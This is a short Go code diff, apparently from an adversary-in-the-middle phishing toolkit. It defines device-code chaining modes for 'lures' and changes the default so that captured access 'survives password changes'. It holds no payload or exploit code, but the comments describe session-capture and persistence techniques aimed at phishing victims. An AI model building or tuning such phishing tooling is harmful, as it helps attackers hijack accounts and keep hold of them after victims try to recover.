@@ -2,8 +2,8 @@ package core
 
 // Device Code chaining modes for lures
 const (
-	DCModeOff      = "off"      // No device code chaining (default)
-	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
+	DCModeOff      = "off"      // No device code chaining
+	DCModeAlways   = "always"   // Always redirect to device code after AitM success (default - survives password changes)
 	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
 	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
 	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
